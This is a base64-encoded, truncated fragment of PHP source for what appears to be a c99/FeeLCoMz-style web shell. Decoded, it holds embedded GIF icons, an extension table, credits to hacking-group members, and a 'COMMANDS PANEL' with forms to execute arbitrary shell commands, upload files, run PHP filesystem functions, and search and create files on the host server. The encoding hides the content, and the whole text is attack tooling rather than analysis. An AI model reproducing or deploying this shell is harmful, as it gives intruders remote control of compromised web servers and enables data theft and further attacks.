JTUkFnIi4KIjJCSHBEQlVlZXdSVjBQREhDcDRCU2dqdzBaR0h6SlFjRVZENElFSEp6WWtCZm80c2VZR2xEQndnVENBQVl2RkU0S0VCSllJNFVyUEYiLgoiQ3lJSUsrd29Zak13UVFJNkNvcjhtS0VueFIwbkFoWUtqSEpGUVlFQ2txU2tTYTE2NElNNkxoTFJycjN3d2FCQ3Uza1BGS0NsZGtBQSIuCiJPdz09IiwKImV4dF9kb2MiPT4KIlIwbEdPRGxoRUFBUUFDSUFBQ0g1QkFFQUFBVUFMQUFBQUFBUUFCQUFnZ0FBQVAvLy84REF3QUFBLzRDQWdBQUFBQUFBQUFBQUFBTlIiLgoiV0VyY3JyQ1FRQ3NsUUEyd093ZFhrSUZXTlZCQStubWU0QVpDdW9sblJ3a3dGOVFnRU9QQUZHMjFBK1o0c1FITzk0cjFlSlJUSlZtcSIuCiJNSU9yclBTV1daUmN6YTZrYW9sQkNPQjBXb3hSdWQwSkFEcz0iLAoiZXh0X2V4ZSI9PgoiUjBsR09EbGhFd0FPQUtJQUFBQUFBUC8vL3dBQXZjYkd4b1NFaFAvLy93QUFBQUFBQUNINUJBRUFBQVVBTEFBQUFBQVRBQTRBQUFNNyIuCiJXTFRjVGlXU1FhdXRCRVExaFArZ2wyMVRLQVFBaW83UzhMeGFHOHgwUGJPY3JRZjR0TnU5d2E4V0hOS0tSbDRzbCt5OVlCdUFkRXF0Ii4KInhoSUFPdz09IiwKImV4dF9oIj0+CiJSMGxHT0RsaEVBQVFBQ0lBQUNINUJBRUFBQVVBTEFBQUFBQVFBQkFBZ3YvLy93QUFBQUFBZ0lDQWdNREF3QUFBQUFBQUFBQUFBQU5CIi4KIldMUGM5WENBU1NjWjhNbEtDY0FSUndWa0VBS0NJQkttTnFWcnE3d3BiTW1iYmJPbnJnSThGK3EzdzlHT1FPTVFHWnlKT3Nwbk1rS28iLgoiV3EvTmtuYmJTZ0FBT3c9PSIsCiJleHRfaHBwIj0+CiJSMGxHT0RsaEVBQVFBQ0lBQUNINUJBRUFBQVVBTEFBQUFBQVFBQkFBZ3YvLy93QUFBQUFBZ0lDQWdNREF3QUFBQUFBQUFBQUFBQU5GIi4KIldMUGM5WENBU1NjWjhNbEtpY29iQndSa0VBR0NJQUtFcWFGcXBiWm5tazQyL2Q0M3lyb0ttTEFEbFBCaXM2THdLTkFGajdqZmFXVlIiLgoiVXFVYWduYkxkWmErWUZjQ0FEcz0iLAoiZXh0X2h0YWNjZXNzIj0+CiJSMGxHT0RsaEVBQVFBQ0lBQUNINUJBRUFBQVlBTEFBQUFBQVFBQkFBZ2dBQUFQOEFBUDhBL3dBQWdJQUFnUC8vQUFBQUFBQUFBQU02Ii4KIldFWFcvazZSQUdzam1Gb1lnTkJiRXdqREIyNWRHWnpWQ0tnc1I4TGhTbnByUFE0MDZwYWZta0R3VXVtSXZKQm9SQUFBbEV1REV3cEoiLgoiQUFBNyIsCiJleHRfaHRtbCI9PgoiUjBsR09EbGhFd0FRQUxNQUFBQUFBUC8vLzJ0cm5NM1AvRkJWaHJQTzlsNkl0b3l0MHloZ2srWHkvV0dwNHNYbC9pNlo0bWZkL0hOeiIuCiJjLy8vL3lINUJBRUFBQThBTEFBQUFBQVRBQkFBQUFTVDhNbDNxcTFtNm5tQy80R2hiRm9YSkVPMUNBTkRTb2NpR2tiQUNIaTIwVTNQIi4KIktJRkdJakFRT0RTaUJXTzVOQXhSUm1UZ2dEZ2ttTTdFNmlpcEhaWUtCVk5RU0JTaWt1a1N3VzRqeW1jdXBZRmdJQnFML01LOEtCRGsiLgoiQmt4MkJYV0RmWDhURERhRkRBMEtCQWQ5Zm5JS0hYWUlCSmdIQlFPSGNnK1ZDaWtWQTV3THBZZ2JCS3VyRHF5c254TU9zN1Mxc3hJUiIuCiJBRHM9IiwKImV4dF9qcGciPT4KIlIwbEdPRGxoRUFBUUFETUFBQ0g1QkFFQUFBa0FMQUFBQUFBUUFCQUFnd0FBQVAvLy84REF3SUNBZ0lDQUFQOEFBQUQvQUlBQUFBQ0EiLgoiQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBUmNjTWhKazcwajZLM0Z1RmJHYlVMd0pjVWhqZ0hnQWtVcUVnSk5FRUFneEVjaSIuCiJDaThBTHNBTGFYQ0dKSzVvMUFHU0JzSUFjQUJnamdDRXdBTUVYcDBCQk1MbC9BNng1V1p0UGZRMmc2KzBqOFZ4KzdiNC9OWnFnZnRkIi4KIkZ4RUFPdz09IiwKImV4dF9qcyI9PgoiUjBsR09EZGhFQUFRQUNJQUFDd0FBQUFBRUFBUUFJTC8vLzhBQUFDQWdJREF3TUQvL3dDQWdBQUFBQUFBQUFBRFVDaTYzQ0VneGliSCIuCiJrMEFRc0cyMDBBUVVKQmdBb01paGo1ZG1JeG5NSnh0cXExZGRFMEVXT2hzRzE2bTlNb29BaVNXRW1UaXVDNFR3MkJCMEw4RmdJQWhzIi4KImEwMEFqWVlCYmMvbzlIak5uaVVBQURzPSIsCiJleHRfbG5rIj0+CiJSMGxHT0RsaEVBQVFBR1lBQUNINUJBRUFBRkFBTEFBQUFBQVFBQkFBaGdBQUFBQmlBR1BMTW1YTU0weS9KbGZGTEZTNksxckdMV2pPIi4KIk5TbXVGVFd6R2tDNUlHM1RPby8xWEU3QUp4Mm9ENVg3WW9UcVVZcndWMy9sVEhUYVFYbmZSbURHTVlYclVqS1FId0FNQUdmTlJIemkiLgoiVXd3NUNBQXFBRE9aR2thc0xYTFlRZ2hJQkJOM0RWRzJOV25QUm5EV1J3Qk9BQjV3RlFCQkFBQStBRkczTkFrNUJTR0hFVXF3TUFCayIuCiJBQUFnQUFBd0FBQmZBRGUwR3hlTEN4WmNERUs2SVV1eEtGakZMRTNBSjJISE1SS2lDUVdDQWdCbUFCcHREZytIQ0JaZURBcUZCV0RHIi4KIk15bVVGUXBXQmoyZkpoZHZEUWhPQkM2WEYzZmRSME82SVIyT0R3QVpBSFBaUUNTUkVnQVNBRGFYSHdBQUFBQUFBQUFBQUFBQUFBQUEiLgoiQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQSIuCiJBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBIi4KIkFBQUFBQUFBQUFBQUFBQUFBQUFBQUFlWmdGQlFQQUdGaG9jQWdvSTdPZzhKQ2dzRUJRSVdQUUNKZ2tDT2tKS1VQNWVZVUQ2UGtaTTUiLgoiTktDS1VETXlOVGczQWdnMlM1ZXFVRXBKRGdjRENBeE1UMDZoZ2syNnZBd1VGVWhEdFlwQ3V3WkJ5Qk1SUk15Q1J3TUdSa1VnMHhJZiIuCiIxbEFlQmlFQUdSZ1hFZzB0NFN3cm9DWWxEUkFuNFNtcEtDb1FKQy9ocVZBdU5Hemc4RTlSS0JFallCUzBKU2hHaDRVTW9ZQVNCaVVRIi4KIkFEcz0iLAoiZXh0X2xvZyI9PgoiUjBsR09EbGhFQUFRQURNQUFDSDVCQUVBQUFnQUxBQUFBQUFRQUJBQWcvLy8vd0FBQU1EQXdJQ0FnSUNBQUFBQWdBQUEvLy8vQUFBQSIuCiJBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFSUUVLRXdLNlV5QnpDNDc1Z0VBbHRKa2xMUkFXemJDbFJocks0THk1eWc3L3dOIi4KInpMVWFMR0JRQlYyRWdGTFY0eEVPU1NXdDlnUVFCcFJwcXhvVk5hUEtrRmI1RWgvTG1VR3pGNXFFMytFTUlnSUFPdz09IiwKImV4dF9waHAiPT4KIlIwbEdPRGxoRUFBUUFJQUJBQUFBQVAvLy95d0FBQUFBRUFBUUFBQUNKa1Flb011YTF0QnhxTEgzN0hVNmFyeFpZTGRJWk1tZDBPcXAiLgoiYUdleVlwcUpsUkcvcmx3QUFEcz0iLAoiZXh0X3BsIj0+CiJSMGxHT0RsaEZBQVVBS0wvQVAvNC84REF3SDkvQVAvNEFMKy92d0FBQUFBQUFBQUFBQ0g1QkFFQUFBRUFMQUFBQUFBVUFCUUFRQU1vIi4KIkdMcmMzZ09BTVlSNE9PdWRyZWVnUmxCV1NKMWxxSzVzNjRMaldGM2NRTWpwSnBEZjYvL0FCQUE3IiwKImV4dF9zd2YiPT4KIlIwbEdPRGxoRkFBVUFNUVJBUCtjblA5U1VzNEFBUCtjQVAvT0FJUUFBUDlqQU01am5NNmNZODZjbktYTzk4YmV4cHdBQVA4eEFQL08iLgoibkFBQUFQLy8vLy8vL3dBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQ0g1QkFFQSIuCiJBQkVBTEFBQUFBQVVBQlFBQUFWN1lDU09aR21lNlBtc2JNdXFVQ3pQMEFQTHpoQWJ1UG5RQXdlRTUyZzBmREtDTUdnb09tNFFCNEdBIi4KIkdCZ2FUMmdNUVlnVmpVZlNUM1lvRkdLQlJnQnFQamdZREVGeFhScERHRUlBNHhBUVFOUjFOSG9NRUFBQ0FCRmhJejhyQ25jTUFHZ0MiLgoiTnlzTGtET1RTQ3NKTkRKYW5UVXFMcU0yS2FhbnFCRWhBRHM9IiwKImV4dF90YXIiPT4KIlIwbEdPRGxoRUFBUUFHWUFBQ0g1QkFFQUFFc0FMQUFBQUFBUUFCQUFoZ0FBQUJsT0FGZ2RBRkFBQUlZQ1V3QThad0E4WjlEWTRKSUMiLgoiV3YvLy93Q0lXQkUyQUFBeVVKaWNxSVNIbDRDQUFQRDQvK0RnOFBYNi81T1hwTDdIMCsvMi9hR21zVEl5TXRUYzVQLy9zZkw1LzhYRiIuCiJIZ0JZcHdCVWxnQlduMUJRQUc4YUlBQlFoUmJmbXdEY2t2K0gxMW5vdUVMbHJpemlwZitWM25QQS80MENVem1tL3dBNFhoVkRBQUdEIi4KIlV5V2QvMGl0LzF1MS8zTnpBUDk1MFA5OTBtTzUvN3YxNFl6dnpYTHJ3b1hJLzV2Uy83RGsvd0JYb3Y5c3l2Ump3T2hhdFFDSFYxN3AiLgoidW8wR1VRQlduUCsrOExtNUFQK2o1UUJVbEFDS1dnQTRiakpRQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQSIuCiJBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBIi4KIkFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUEiLgoiQUFBQUFBQUFBQUFBQUFBQUFBQUFBQWVlZ0FLQ2c0U0ZTeFlORXc0Z01nU09qNDhERkFjSEVVSVpSRVlvSkRRelBUNC9Bd2NRQ1FrZyIuCiJHd2lwcXFrcUF4SWFGUmdYRHdPMXRyY0F1YnE3dkllSkRpd2hCY1BFeEF5VGxTRVpPem81S1RVeE1Dc3ZES09sU1JzY0hEd2VIa01kIi4KIkhVY01yN0d6QnVmbzZBeTg3THUraWkwZkFmUDA5QXZJRVI4Wk5qYzRRU1VtVG9nWXNjQmFBaVZGa0NoWXlCQ0lpd1hrWkQyb1IzRkIiLgoidTR0TEFnRUFPdz09IiwKImV4dF90eHQiPT4KIlIwbEdPRGxoRXdBUUFLSUFBQUFBQVAvLy84Ykd4b1NFaFAvLy93QUFBQUFBQUFBQUFDSDVCQUVBQUFRQUxBQUFBQUFUQUJBQUFBTkoiLgoiU0FyRTNsREpGa2E5MXJLcEEvRGdKM0pCYVo2bHNDa1c2cXFrQjRqekY4QlM2NTQ0VzlaQVc0K2cyNlZXeEY5d2Rvd1ptem5sRXVwNyIuCiJVcFBXRzNJZzZIcS9YbVJqdVp3a0FBQTciLAoiZXh0X3dyaSI9PgoiUjBsR09EbGhFQUFRQURNQUFDSDVCQUVBQUFnQUxBQUFBQUFRQUJBQWcvLy8vd0FBQUlDQWdNREF3SUNBQUFBQWdBQUEvLy8vQUFBQSIuCiJBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFSUlVNaEprYjBDNksySHVFaVJjZHNBZktFeGtrRGdCb1Z4c3R3QUF5cGR1b2FvIi4KImE0U1hUMGM0QkYwclVoRkFFQVFRSTlkbWViUkVXOHlYQzZOeDJRSTdMcllidHBKWk5zeGd6VzZuTGRxNDloSUJBRHM9IiwKImV4dF94bWwiPT4KIlIwbEdPRGxoRUFBUUFFUUFBQ0g1QkFFQUFCQUFMQUFBQUFBUUFCQUFoUC8vL3dBQUFQSHg4WWFHaGpObW1hYks4QUFBbVFBQWdBQ0EiLgoiZ0RPWkFETm0vek9aL3pQLy84REF3RFBNL3dBQS93QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQSIuCiJBQUFBQUFBQUFBQUFBQUFBQUFWazRDQ09wQWlkMEFDc2JOc01xTnF1QWlBMEFKelNkbDhId01CT1VLZ2hFQXBiRVNCVUZRd0FCSUN4Ii4KIk9BQU14ZWJUaG1BNEVvY2F0Z25ZS2hhSmh4VXJJQk5yaDdqeXQvUFphKzBoWWMvbjAyVjRkelp1ZllWL1BJR0pib0tCUWtHUGtFRVEiLgoiSVFBNyIKKTsKLy9VbnR1ayBvcHRpbWFsaXNhc2kgdWt1cmFuIGRhbiBrZWNlcGF0YW4uCiRpbWdlcXVhbHMgPSBhcnJheSgKICAiZXh0X3RhciI9PmFycmF5KCJleHRfdGFyIiwiZXh0X3IwMCIsImV4dF9hY2UiLCJleHRfYXJqIiwiZXh0X2J6IiwiZXh0X2J6MiIsImV4dF90YnoiLCJleHRfdGJ6MiIsImV4dF90Z3oiLCJleHRfdXUiLCJleHRfeHhlIiwiZXh0X3ppcCIsImV4dF9jYWIiLCJleHRfZ3oiLCJleHRfaXNvIiwiZXh0X2xoYSIsImV4dF9semgiLCJleHRfcGJrIiwiZXh0X3JhciIsImV4dF91dWYiKSwKICAiZXh0X3BocCI9PmFycmF5KCJleHRfcGhwIiwiZXh0X3BocDMiLCJleHRfcGhwNCIsImV4dF9waHA1IiwiZXh0X3BodG1sIiwiZXh0X3NodG1sIiwiZXh0X2h0bSIpLAogICJleHRfanBnIj0+YXJyYXkoImV4dF9qcGciLCJleHRfZ2lmIiwiZXh0X3BuZyIsImV4dF9qcGVnIiwiZXh0X2pmaWYiLCJleHRfanBlIiwiZXh0X2JtcCIsImV4dF9pY28iLCJleHRfdGlmIiwidGlmZiIpLAogICJleHRfaHRtbCI9PmFycmF5KCJleHRfaHRtbCIsImV4dF9odG0iKSwKICAiZXh0X2F2aSI9PmFycmF5KCJleHRfYXZpIiwiZXh0X21vdiIsImV4dF9tdmkiLCJleHRfbXBnIiwiZXh0X21wZWciLCJleHRfd212IiwiZXh0X3JtIiksCiAgImV4dF9sbmsiPT5hcnJheSgiZXh0X2xuayIsImV4dF91cmwiKSwKICAiZXh0X2luaSI9PmFycmF5KCJleHRfaW5pIiwiZXh0X2NzcyIsImV4dF9pbmYiKSwKICAiZXh0X2RvYyI9PmFycmF5KCJleHRfZG9jIiwiZXh0X2RvdCIpLAogICJleHRfanMiPT5hcnJheSgiZXh0X2pzIiwiZXh0X3ZicyIpLAogICJleHRfY21kIj0+YXJyYXkoImV4dF9jbWQiLCJleHRfYmF0IiwiZXh0X3BpZiIpLAogICJleHRfd3JpIj0+YXJyYXkoImV4dF93cmkiLCJleHRfcnRmIiksCiAgImV4dF9zd2YiPT5hcnJheSgiZXh0X3N3ZiIsImV4dF9mbGEiKSwKICAiZXh0X21wMyI9PmFycmF5KCJleHRfbXAzIiwiZXh0X2F1IiwiZXh0X21pZGkiLCJleHRfbWlkIiksCiAgImV4dF9odGFjY2VzcyI9PmFycmF5KCJleHRfaHRhY2Nlc3MiLCJleHRfaHRwYXNzd2QiLCJleHRfaHQiLCJleHRfaHRhIiwiZXh0X3NvIikKKTsKaWYgKCEkZ2V0YWxsKSB7CiAgaGVhZGVyKCJDb250ZW50LXR5cGU6IGltYWdlL2dpZiIpOwogIGhlYWRlcigiQ2FjaGUtY29udHJvbDogcHVibGljIik7CiAgaGVhZGVyKCJFeHBpcmVzOiAiLmRhdGUoInIiLG1rdGltZSgwLDAsMCwxLDEsMjAzMCkpKTsKICBoZWFkZXIoIkNhY2hlLWNvbnRyb2w6IG1heC1hZ2U9Ii4oNjAqNjAqMjQqNykpOwogIGhlYWRlcigiTGFzdC1Nb2RpZmllZDogIi5kYXRlKCJyIixmaWxlbXRpbWUoX19GSUxFX18pKSk7CiAgZm9yZWFjaCgkaW1nZXF1YWxzIGFzICRrPT4kdikge2lmIChpbl9hcnJheSgkaW1nLCR2KSkgeyRpbWcgPSAkazsgYnJlYWs7fX0KICBpZiAoZW1wdHkoJGltYWdlc1skaW1nXSkpIHskaW1nID0gInNtYWxsX3VuayI7fQogIGlmIChpbl9hcnJheSgkaW1nLCRleHRfdGFyKSkgeyRpbWcgPSAiZXh0X3RhciI7fQogIGVjaG8gYmFzZTY0X2RlY29kZSgkaW1hZ2VzWyRpbWddKTsKfQplbHNlIHsKICBmb3JlYWNoKCRpbWdlcXVhbHMgYXMgJGE9PiRiKSB7Zm9yZWFjaCAoJGIgYXMgJGQpIHtpZiAoJGEgIT0gJGQpIHtpZiAoIWVtcHR5KCRpbWFnZXNbJGRdKSkge2VjaG8oIldhcm5pbmchIFJlbW92ZSBcJGltYWdlc1siLiRkLiJdPGJyPiIpO319fX0KICBuYXRzb3J0KCRpbWFnZXMpOwogICRrID0gYXJyYXlfa2V5cygkaW1hZ2VzKTsKICBlY2hvICAiPGNlbnRlcj4iOwogIGZvcmVhY2ggKCRrIGFzICR1KSB7ZWNobyAkdS4iOjxpbWcgc3JjPVwiIi4kc3VybC4iYWN0PWltZyZpbWc9Ii4kdS4iXCIgYm9yZGVyPVwiMVwiPjxicj4iO30KICBlY2hvICI8L2NlbnRlcj4iOwp9CmV4aXQ7Cn0KaWYgKCRhY3QgPT0gImFib3V0IikgewogIGVjaG8gIjxjZW50ZXI+PGI+Q3JlZGl0czo8L2I+PGJyPklkZWEsIGxlYWRpbmcgYW5kIGNvZGluZyBieSA8Yj50cmlzdHJhbSBbQ0NUZWFNXTwvYj48YnI+Ii4KICAgICAgICJCZXRhLXRlc3RpbmcgYW5kIHNvbWUgdGlwcyBieSA8Yj5OdWtMZW9OIFtBblRpU2hAUmUgdEVhTV08L2I+PGJyPiIuCiAgICAgICAiUmUtQ29kaW5nLCB0cmlja3MsIGh0bWwgYW5kIGNzcyBieSA8Yj5GYVRhTGlzVGlDel9GeCBbRmVlTENvTXogQ29NTXVOaVR5XTwvYj48YnI+PGJyPiIuCiAgICAgICAiUmVwb3J0IGJ1Z3MgdG8gPGEgaHJlZj1cIm1haWx0bzpcIj5GYVRhTGlzVGlDel9GeDwvYT48L2I+IjsKfQplY2hvICI8L3RkPjwvdHI+PC90YWJsZT5cbiI7Ci8qKiogQ09NTUFORFMgUEFORUwgKioqLwo/Pgo8ZGl2ICBjbGFzcz1iYXJ0aXRsZT48Yj4uOiBDT01NQU5EUyBQQU5FTCA6LjwvYj48L2Rpdj4KPHRhYmxlIGNsYXNzPW1haW5wYW5lbD4KPHRyPjx0ZCBhbGlnbj1yaWdodD5Db21tYW5kOjwvdGQ+Cjx0ZD48Zm9ybSBtZXRob2Q9IlBPU1QiPgogICAgPGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9YWN0IHZhbHVlPSJjbWQiPgogICAgPGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9ImQiIHZhbHVlPSI8P3BocCBlY2hvICRkaXNwZDsgPz4iPgogICAgPGlucHV0IHR5cGU9InRleHQiIG5hbWU9ImNtZCIgc2l6ZT0iMTAwIiB2YWx1ZT0iPD9waHAgZWNobyBodG1sc3BlY2lhbGNoYXJzKCRjbWQpOyA/PiI+CiAgICA8aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT0iY21kX3R4dCIgdmFsdWU9IjEiPiA8aW5wdXQgdHlwZT1zdWJtaXQgbmFtZT1zdWJtaXQgdmFsdWU9IkV4ZWN1dGUiPgogICAgPC9mb3JtPgo8L3RkPjwvdHI+Cjx0cj48dGQgYWxpZ249cmlnaHQ+UXVpY2sgQ29tbWFuZHM6PC90ZD4KPHRkPjxmb3JtIG1ldGhvZD0iUE9TVCI+CiAgICA8aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT1hY3QgdmFsdWU9ImNtZCI+CiAgICA8aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT0iZCIgdmFsdWU9Ijw/cGhwIGVjaG8gJGRpc3BkOyA/PiI+CiAgICA8aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT0iY21kX3R4dCIgdmFsdWU9IjEiPgogICAgPHNlbGVjdCBuYW1lPSJjbWQiPgogICAgPD9waHAKICAgIGZvcmVhY2ggKCRjbWRhbGlhc2VzIGFzICRhbHMpIHsKICAgICAgZWNobyAiPG9wdGlvbiB2YWx1ZT1cIiIuaHRtbHNwZWNpYWxjaGFycygkYWxzWzFdKS4iXCI+Ii5odG1sc3BlY2lhbGNoYXJzKCRhbHNbMF0pLiI8L29wdGlvbj4iOwogICAgfQogICAgZm9yZWFjaCAoJGNtZGFsaWFzZXMyIGFzICRhbHMpIHsKICAgICAgZWNobyAiPG9wdGlvbiB2YWx1ZT1cIiIuaHRtbHNwZWNpYWxjaGFycygkYWxzWzFdKS4iXCI+Ii5odG1sc3BlY2lhbGNoYXJzKCRhbHNbMF0pLiI8L29wdGlvbj4iOwogICAgfQogICAgPz4KICAgIDwvc2VsZWN0PiA8aW5wdXQgdHlwZT1zdWJtaXQgbmFtZT1zdWJtaXQgdmFsdWU9IkV4ZWN1dGUiPgogICAgPC9mb3JtPgo8L3RkPjwvdHI+Cjx0cj48dGQgYWxpZ249cmlnaHQ+VXBsb2FkOjwvdGQ+Cjx0ZD48Zm9ybSBtZXRob2Q9IlBPU1QiIGVuY3R5cGU9Im11bHRpcGFydC9mb3JtLWRhdGEiPgogICAgPGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9YWN0IHZhbHVlPSJ1cGxvYWQiPgogICAgPGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9Im1pbmlmb3JtIiB2YWx1ZT0iMSI+CiAgICA8aW5wdXQgdHlwZT0iZmlsZSIgbmFtZT0idXBsb2FkZmlsZSI+IDxpbnB1dCB0eXBlPXN1Ym1pdCBuYW1lPXN1Ym1pdCB2YWx1ZT0iVXBsb2FkIj4gPD9waHAgZWNobyAkd2R0LiIgTWF4IHNpemU6ICIuIEBpbmlfZ2V0KCJ1cGxvYWRfbWF4X2ZpbGVzaXplIikuIkIiOyA/PgogICAgPC9mb3JtPgo8L3RkPjwvdHI+Cjx0cj48dGQgYWxpZ249cmlnaHQ+UEhQIEZpbGVzeXN0ZW06PC90ZD4KPHRkPgo8P3BocCAjI1sgRmFUYUxpc1RpQ3pfRnggVHJpQ2t6IF0jIyA/Pgo8c2NyaXB0IGxhbmd1YWdlPSJqYXZhc2NyaXB0Ij4KZnVuY3Rpb24gc2V0X2FyZyh0eHQxLHR4dDIpIHsKICBkb2N1bWVudC5mb3Jtcy5mcGhwZnN5cy5waHBmc3lzZnVuYy52YWx1ZS5zZWxlY3RlZCA9ICJEb3dubG9hZCI7CiAgZG9jdW1lbnQuZm9ybXMuZnBocGZzeXMuYXJnMS52YWx1ZSA9IHR4dDE7CiAgZG9jdW1lbnQuZm9ybXMuZnBocGZzeXMuYXJnMi52YWx1ZSA9IHR4dDI7Cn0KZnVuY3Rpb24gY2hnX2FyZyhudW0sdHh0MSx0eHQyKSB7CiAgaWYgKG51bT09MCkgewogICAgZG9jdW1lbnQuZm9ybXMuZnBocGZzeXMuYXJnMS50eXBlID0gImhpZGRlbiI7CiAgICBkb2N1bWVudC5mb3Jtcy5mcGhwZnN5cy5BMS50eXBlID0gImhpZGRlbiI7CiAgfQogIGlmIChudW08PTEpIHsKICAgIGRvY3VtZW50LmZvcm1zLmZwaHBmc3lzLmFyZzIudHlwZSA9ICJoaWRkZW4iOwogICAgZG9jdW1lbnQuZm9ybXMuZnBocGZzeXMuQTIudHlwZSA9ICJoaWRkZW4iOwogIH0KICBpZiAobnVtPT0yKSB7CiAgICBkb2N1bWVudC5mb3Jtcy5mcGhwZnN5cy5BMS50eXBlID0gImxhYmVsIjsKICAgIGRvY3VtZW50LmZvcm1zLmZwaHBmc3lzLkEyLnR5cGUgPSAibGFiZWwiOwogICAgZG9jdW1lbnQuZm9ybXMuZnBocGZzeXMuYXJnMS50eXBlID0gInRleHQiOwogICAgZG9jdW1lbnQuZm9ybXMuZnBocGZzeXMuYXJnMi50eXBlID0gInRleHQiOwogIH0KICBkb2N1bWVudC5mb3Jtcy5mcGhwZnN5cy5BMS52YWx1ZSA9IHR4dDEgKyAiOiI7CiAgZG9jdW1lbnQuZm9ybXMuZnBocGZzeXMuQTIudmFsdWUgPSB0eHQyICsgIjoiOwp9Cjwvc2NyaXB0Pgo8P3BocAogIGVjaG8gIjxmb3JtIG5hbWU9XCJmcGhwZnN5c1wiIG1ldGhvZD1cIlBPU1RcIj48aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT1hY3QgdmFsdWU9XCJwaHBmc3lzXCI+PGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9ZCB2YWx1ZT1cIiRkaXNwZFwiPlxyXG4iLgogICAgICAgIjxzZWxlY3QgbmFtZT1cInBocGZzeXNmdW5jXCI+XHJcbiI7CiAgZm9yZWFjaCAoJHBocGZzYWxpYXNlcyBhcyAkYWxzKSB7CiAgICBpZiAoJGFsc1sxXT09JHBocGZzeXNmdW5jKSB7CiAgICAgIGVjaG8gIjxvcHRpb24gc2VsZWN0ZWQgdmFsdWU9XCIiLiRhbHNbMV0uIlwiIG9uY2xpY2s9XCJjaGdfYXJnKCckYWxzWzJdJywnJGFsc1szXScsJyRhbHNbNF0nKVwiPiIuJGFsc1swXS4iPC9vcHRpb24+XHJcbiI7CiAgICB9CiAgICBlbHNlIHsKICAgICAgZWNobyAiPG9wdGlvbiB2YWx1ZT1cIiIuJGFsc1sxXS4iXCIgb25jbGljaz1cImNoZ19hcmcoJyRhbHNbMl0nLCckYWxzWzNdJywnJGFsc1s0XScpXCI+Ii4kYWxzWzBdLiI8L29wdGlvbj5cclxuIjsKICAgIH0KICB9CiAgZWNobyAiPC9zZWxlY3Q+XHJcbiIuCiAgICAgICAiPGlucHV0IHR5cGU9bGFiZWwgbmFtZT1BMSB2YWx1ZT1cIkZpbGU6XCIgc2l6ZT0yIGRpc2FibGVkPiA8aW5wdXQgdHlwZT10ZXh0IG5hbWU9YXJnMSBzaXplPTQwIHZhbHVlPVwiIi5odG1sc3BlY2lhbGNoYXJzKCRhcmcxKS4iXCI+XHJcbiIuCiAgICAgICAiPGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9QTIgc2l6ZT0yIGRpc2FibGVkPiA8aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT1hcmcyIHNpemU9NTAgdmFsdWU9XCIiLmh0bWxzcGVjaWFsY2hhcnMoJGFyZzIpLiJcIj5cclxuIi4KICAgICAgICI8aW5wdXQgdHlwZT1zdWJtaXQgbmFtZT1zdWJtaXQgdmFsdWU9XCJFeGVjdXRlXCI+PGhyIG5vc2hhZGUgc2l6ZT0xPlxyXG4iOwogIGZvcmVhY2ggKCRzaF9zb3VyY2V6IGFzICRlID0+ICRvKSB7CiAgICBlY2hvICI8aW5wdXQgdHlwZT1idXR0b24gdmFsdWU9XCIkZVwiIG9uY2xpY2s9XCJzZXRfYXJnKCckb1swXScsJyRvWzFdJylcIj5cclxuIjsKICB9CiAgZWNobyAiPC9mb3JtPlxyXG4iOwo/Pgo8L3RkPjwvdHI+Cjx0cj48dGQgYWxpZ249cmlnaHQ+U2VhcmNoIEZpbGU6PC90ZD4KPHRkPjxmb3JtIG1ldGhvZD0iUE9TVCI+PGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9YWN0IHZhbHVlPSJzZWFyY2giPjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPSJkIiB2YWx1ZT0iPD9waHAgZWNobyAkZGlzcGQ7ID8+Ij4KICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJzZWFyY2hfbmFtZSIgc2l6ZT0iMjkiIHZhbHVlPSIoLiopIj4gPGlucHV0IHR5cGU9ImNoZWNrYm94IiBuYW1lPSJzZWFyY2hfbmFtZV9yZWdleHAiIHZhbHVlPSIxIiBjaGVja2VkPiByZWdleHAgPGlucHV0IHR5cGU9c3VibWl0IG5hbWU9c3VibWl0IHZhbHVlPSJTZWFyY2giPgogICAgPC9mb3JtPgogICAgPC90ZD48L3RyPgo8dHI+PHRkIGFsaWduPXJpZ2h0PkNyZWF0ZSBGaWxlOjwvdGQ+Cjx0ZD48Zm9ybSBtZXRob2Q9IlBPU1QiPjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPWFjdCB2YWx1ZT0ibWtmaWxlIj48aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT0iZCIgdmFsdWU9Ijw/cGhwIGVjaG8gJGRpc3BkOyA/PiI+PGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9ImZ0IiB2YWx1ZT0iZWRpdCI+CiAgICA8aW5wdXQgdHlwZT0idGV4dCIg